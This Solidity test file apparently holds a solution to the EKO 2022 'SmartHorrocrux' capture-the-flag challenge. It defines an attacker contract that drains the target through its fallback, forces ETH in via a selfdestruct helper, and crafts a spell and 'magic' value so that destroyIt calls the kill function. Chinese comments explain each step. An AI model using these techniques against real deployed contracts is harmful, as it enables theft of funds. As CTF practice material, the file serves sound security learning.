// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {SmartHorrocrux} from "../../src/eko2022/06_SmartHorrocrux/SmartHorrocrux.sol";

contract SmartHorrocrux_Attacker {
	address player;
	SmartHorrocrux smartHorrocrux;
	
	constructor(SmartHorrocrux smartHorrocrux_) payable {
		player = msg.sender;
		smartHorrocrux = smartHorrocrux_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 掏空目标合约的ETH
		(bool success,) = address(smartHorrocrux).call("123");
		//require(success, "Trigger Fallback Failed");

		// 使用自毁的方式，向目标合约转账
		ForceSendEth forceSendEth = new ForceSendEth{value: 1}();
		forceSendEth.doSelfDestructToTarget(address(smartHorrocrux));
		require(address(smartHorrocrux).balance == 1);
		smartHorrocrux.setInvincible();

		// 分析`destroyIt`函数
		// 针对 spellInBytes := mload(add(spell, 32)) | require(spellInBytes == _spell, "That spell wouldn't kill a fly");
		// 使得 spell 恰好填满32个字节
		// bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));
		// 需要使得 kedavra == SmartHorrocrux.kill.selector
		// 意味着   bytes4(SmartHorrocrux.kill.selector) == bytes4(bytes32(uint256(spellInBytes) - magic))
		// 意味着   SmartHorrocrux.kill.selector == bytes32(uint256(spellInBytes) - magic)

		bytes4 killSelector = SmartHorrocrux.kill.selector;
		bytes32 killSelector32 = bytes32(killSelector);
		uint256 killSelectorUint256 = uint256(killSelector32);

		// 获取 _spell
		bytes32 spellBytes32 = 0x45746865724b6164616272610000000000000000000000000000000000000000;
		bytes memory spellBytes = abi.encodePacked(spellBytes32);
		string memory spellString = string(spellBytes);
		uint256 magic = uint256(spellBytes32) - killSelectorUint256;

		// 执行`摧毁`
		smartHorrocrux.destroyIt(spellString, magic);
	}
}

contract ForceSendEth {
	constructor() payable {}
	
	function doSelfDestructToTarget(address target) public {
		selfdestruct(payable(target));
	}
}
